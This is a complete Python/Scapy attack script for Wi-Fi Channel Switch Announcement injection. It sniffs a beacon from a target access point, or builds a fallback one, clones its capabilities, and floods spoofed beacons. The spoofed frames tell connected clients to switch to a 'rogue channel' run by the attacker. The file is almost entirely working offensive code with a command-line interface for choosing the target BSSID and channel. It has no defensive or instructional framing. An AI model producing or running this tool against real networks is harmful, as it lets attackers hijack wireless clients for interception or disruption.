#!/usr/bin/env python3
"""
CSA (Channel Switch Announcement) injection via Scapy.

Phase 1: Sniffs a real beacon from the target BSSID to clone its exact
         capability profile (VHT, HT, RSN, rates, channel width, etc.)
Phase 2: Injects spoofed copies with CSA/ECSA elements appended, using
         a spec-compliant decrementing countdown pattern.

Falls back to generated beacons if no real beacon is captured within
the sniff window.
"""

import argparse
import struct
import sys
import time
from dataclasses import dataclass, field
from typing import List, Optional, Tuple

from scapy.all import (
    Dot11,
    Dot11Beacon,
    Dot11Elt,
    RadioTap,
    conf,
    sniff as scapy_sniff,
)
from scapy.sendrecv import sendp

STRIP_IE_IDS = frozenset({
    37,   # CSA
    60,   # ECSA
    62,   # Secondary Channel Offset
    196,  # Channel Switch Wrapper
})

HT40_PLUS = frozenset({
    36, 44, 52, 60, 100, 108, 116, 124, 132, 140, 149, 157,
})
HT40_MINUS = frozenset({
    40, 48, 56, 64, 104, 112, 120, 128, 136, 144, 153, 161,
})

VHT80_CENTERS = {
    36: 42, 40: 42, 44: 42, 48: 42,
    52: 58, 56: 58, 60: 58, 64: 58,
    100: 106, 104: 106, 108: 106, 112: 106,
    116: 122, 120: 122, 124: 122, 128: 122,
    132: 138, 136: 138, 140: 138, 144: 138,
    149: 155, 153: 155, 157: 155, 161: 155,
}

COUNTDOWN_START = 3
SUSTAIN_FRAMES = 30


@dataclass
class BeaconTemplate:
    """Parsed beacon fields for frame reconstruction."""

    cap: int = 0
    timestamp: int = 0
    beacon_interval: int = 100
    ies: List[Tuple[int, bytes]] = field(default_factory=list)
    has_vht: bool = False
    source: str = "fallback"


# -------------------------------------------------------------------
# Phase 1: Beacon acquisition
# -------------------------------------------------------------------

def sniff_beacon(iface, bssid, timeout=3.0, retries=3):
    """Sniff with retries for stubborn APs."""
    target = bssid.lower()

    def match(pkt):
        if not pkt.haslayer(Dot11Beacon):
            return False
        addr2 = pkt[Dot11].addr2
        return addr2 is not None and addr2.lower() == target

    for attempt in range(retries):
        captured = scapy_sniff(
            iface=iface,
            lfilter=match,
            count=1,
            timeout=timeout,
            monitor=True,
        )
        if captured:
            break
        if attempt < retries - 1:
            print(
                f"[csa] sniff attempt {attempt + 1} missed — "
                f"retrying",
                file=sys.stderr,
            )

    if not captured:
        return None

    beacon = captured[0][Dot11Beacon]

    template = BeaconTemplate(
        cap=beacon.cap,
        timestamp=beacon.timestamp,
        beacon_interval=beacon.beacon_interval,
        source="sniffed",
    )

    layer = beacon.payload
    while isinstance(layer, Dot11Elt):
        ie_id = layer.ID
        ie_info = bytes(layer.info) if layer.info else b""

        if ie_id == 191:
            template.has_vht = True
        if ie_id == 192:
            template.has_vht = True

        if ie_id not in STRIP_IE_IDS:
            template.ies.append((ie_id, ie_info))

        layer = layer.payload

    return template


def build_fallback_template(ssid: str, channel: int) -> BeaconTemplate:
    """
    Generate a plausible template when beacon sniff fails.
    Now includes WPA3/PMF/VHT for modern AP compatibility.
    """
    is_5ghz = channel > 14

    template = BeaconTemplate(
        cap=0x1431,
        timestamp=500_000_000_000,
        beacon_interval=100,
        has_vht=is_5ghz,
        source="fallback",
    )

    # SSID (ID 0)
    template.ies.append((0, ssid.encode()))

    # Supported Rates (ID 1)
    if is_5ghz:
        rates = bytes([
            0x8C, 0x12, 0x98, 0x24, 0xB0, 0x48, 0x60, 0x6C,
        ])
    else:
        rates = bytes([
            0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24,
        ])
    template.ies.append((1, rates))

    # DS Parameter Set (ID 3)
    template.ies.append((3, struct.pack("B", channel)))

    # TIM (ID 5)
    template.ies.append((5, struct.pack("BBBB", 0, 1, 0, 0)))

    # RSN (ID 48) — WPA3-SAE with PMF Required
    # Version: 1
    # Group Cipher: CCMP (00-0F-AC:04)
    # Pairwise Count: 1, Pairwise: CCMP
    # AKM Count: 1, AKM: SAE (00-0F-AC:08)
    # RSN Capabilities: 0x00C0 (MFPC=1, MFPR=1)
    rsn_body = struct.pack(
        "<HI H I H I H",
        1,            # version
        0x000FAC04,   # group cipher: CCMP
        1,            # pairwise count
        0x000FAC04,   # pairwise: CCMP
        1,            # AKM count
        0x000FAC08,   # AKM: SAE
        0x00C0,       # capabilities: MFPC + MFPR
    )
    template.ies.append((48, rsn_body))

    # HT Capabilities (ID 45)
    ht_cap_info = struct.pack("<H", 0x006E)
    ht_ampdu = struct.pack("B", 0x03)
    mcs_set = b"\xFF\xFF" + b"\x00" * 14
    ht_ext = struct.pack("<H", 0x0000)
    ht_txbf = struct.pack("<I", 0x00000000)
    ht_asel = struct.pack("B", 0x00)
    ht_body = (
        ht_cap_info + ht_ampdu + mcs_set
        + ht_ext + ht_txbf + ht_asel
    )
    template.ies.append((45, ht_body))

    # HT Operation (ID 61)
    sec_offset = compute_secondary_offset(channel)
    ht_op = struct.pack(
        "<B B H H H",
        channel,
        sec_offset,
        0x0000,
        0x0000,
        0x0000,
    ) + b"\x00" * 16  # Basic MCS set
    template.ies.append((61, ht_op))

    if is_5ghz:
        # VHT Capabilities (ID 191)
        # Short GI 80, 2 SS, 80 MHz
        vht_cap = struct.pack("<I", 0x03800032)
        vht_mcs = struct.pack("<HH HH",
            0xFFFA,  # RX MCS: SS1-2 MCS 0-9
            0x0000,  # RX highest rate
            0xFFFA,  # TX MCS
            0x0000,  # TX highest rate
        )
        template.ies.append((191, vht_cap + vht_mcs))

        # VHT Operation (ID 192)
        center = VHT80_CENTERS.get(channel, 0)
        vht_op = struct.pack(
            "BBB",
            1,       # channel width: 80 MHz
            center,  # center freq seg 0
            0,       # center freq seg 1
        ) + struct.pack("<H", 0xFFFA)  # basic MCS
        template.ies.append((192, vht_op))

    return template

# -------------------------------------------------------------------
# CSA IE construction
# -------------------------------------------------------------------


def get_operating_class(channel: int) -> int:
    """20MHz operating class for ECSA element."""
    if 1 <= channel <= 13:
        return 81
    if channel == 14:
        return 82
    if 36 <= channel <= 48:
        return 115
    if 52 <= channel <= 64:
        return 118
    if 100 <= channel <= 144:
        return 121
    if 149 <= channel <= 165:
        return 124
    return 115


def compute_secondary_offset(channel: int) -> int:
    """HT40 secondary channel offset. 0=none, 1=above, 3=below."""
    if channel in HT40_PLUS:
        return 1
    if channel in HT40_MINUS:
        return 3
    return 0


def build_csa_ies(
    target_channel: int,
    switch_count: int,
) -> List[Tuple[int, bytes]]:
    """
    Build CSA, ECSA, and Secondary Channel Offset IEs.

    The target channel is the rogue AP channel, which runs HT20.
    No Wide Bandwidth Channel Switch is included because the
    destination BSS is not VHT.
    """
    ies = []

    # CSA (ID 37): mode=1 (clients must stop transmitting), channel, count
    ies.append((
        37,
        struct.pack("BBB", 1, target_channel, switch_count),
    ))

    # ECSA (ID 60): mode, operating class (20MHz), channel, count
    op_class = get_operating_class(target_channel)
    ies.append((
        60,
        struct.pack("BBBB", 1, op_class, target_channel, switch_count),
    ))

    # Secondary Channel Offset (ID 62)
    sec_offset = compute_secondary_offset(target_channel)
    ies.append((62, struct.pack("B", sec_offset)))

    return ies


# -------------------------------------------------------------------
# Frame assembly
# -------------------------------------------------------------------


def build_frame(
    template: BeaconTemplate,
    bssid: str,
    seq_num: int,
    tsf: int,
    target_channel: int,
    switch_count: int,
) -> bytes:
    """Assemble a complete beacon from cloned IEs + CSA IEs."""
    frame = (
        RadioTap()
        / Dot11(
            type=0,
            subtype=8,
            addr1="ff:ff:ff:ff:ff:ff",
            addr2=bssid,
            addr3=bssid,
            SC=(seq_num % 4096) << 4,
        )
        / Dot11Beacon(
            cap=template.cap,
            timestamp=tsf,
            beacon_interval=template.beacon_interval,
        )
    )

    # Append cloned IEs in original order
    for ie_id, ie_info in template.ies:
        frame = frame / Dot11Elt(ID=ie_id, info=ie_info)

    # Append CSA IEs at end of IE chain
    for ie_id, ie_info in build_csa_ies(target_channel, switch_count):
        frame = frame / Dot11Elt(ID=ie_id, info=ie_info)

    return bytes(frame)


# -------------------------------------------------------------------
# Injection engine
# -------------------------------------------------------------------


def inject(
    iface: str,
    bssid: str,
    ssid: str,
    channel: int,
    target_channel: int,
    duration: int,
    rate: float,
) -> Tuple[int, str]:
    """
    Sniff one beacon, clone it, inject CSA copies for `duration` seconds.

    Returns (frame_count, template_source).
    """
    conf.iface = iface

    template = sniff_beacon(iface, bssid)
    if template is None:
        print(
            f"[csa] no beacon from {bssid} — fallback template",
            file=sys.stderr,
        )
        template = build_fallback_template(ssid, channel)
    else:
        vht_tag = "VHT" if template.has_vht else "HT"
        ie_count = len(template.ies)
        print(
            f"[csa] cloned {bssid} ({vht_tag}, {ie_count} IEs)",
            file=sys.stderr,
        )


    tsf_base = template.timestamp
    tsf_increment = template.beacon_interval * 1024

    seq_num = 0
    frame_count = 0
    countdown = COUNTDOWN_START
    sustain_remaining = 0
    end_time = time.time() + duration

    try:
        while time.time() < end_time:
            if sustain_remaining > 0:
                switch_count = 0
                sustain_remaining -= 1
            else:
                switch_count = countdown
                countdown -= 1
                if countdown < 0:
                    sustain_remaining = SUSTAIN_FRAMES
                    countdown = COUNTDOWN_START

            frame_bytes = build_frame(
                template=template,
                bssid=bssid,
                seq_num=seq_num,
                tsf=tsf_base + (frame_count * tsf_increment),
                target_channel=target_channel,
                switch_count=switch_count,
            )

            sendp(frame_bytes, iface=iface, verbose=False)
            frame_count += 1
            seq_num += 1

            if rate > 0:
                time.sleep(rate)
    finally:
        pass

    return frame_count, template.source


# -------------------------------------------------------------------
# CLI
# -------------------------------------------------------------------


def main():
    parser = argparse.ArgumentParser(
        description=(
            "CSA beacon injection with automatic beacon cloning. "
            "Sniffs one real beacon from the target AP to replicate "
            "its exact capability profile before injecting."
        ),
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument(
        "--iface",
        required=True,
        help="Monitor-mode interface",
    )
    parser.add_argument(
        "--bssid",
        required=True,
        help="Target AP BSSID to spoof",
    )
    parser.add_argument(
        "--ssid",
        required=True,
        help="Target AP SSID (used only if beacon sniff fails)",
    )
    parser.add_argument(
        "--channel",
        required=True,
        type=int,
        help="Target AP current channel",
    )
    parser.add_argument(
        "--target-channel",
        required=True,
        type=int,
        help="Rogue channel to direct clients toward",
    )
    parser.add_argument(
        "--duration",
        type=int,
        default=5,
        help="Injection duration in seconds",
    )
    parser.add_argument(
        "--rate",
        type=float,
        default=0.01,
        help="Delay between frames in seconds",
    )

    args = parser.parse_args()

    count, source = inject(
        iface=args.iface,
        bssid=args.bssid,
        ssid=args.ssid,
        channel=args.channel,
        target_channel=args.target_channel,
        duration=args.duration,
        rate=args.rate,
    )

    print(
        f"[csa] done — {count} frames injected "
        f"(template: {source})",
        file=sys.stderr,
    )


if __name__ == "__main__":
    main()
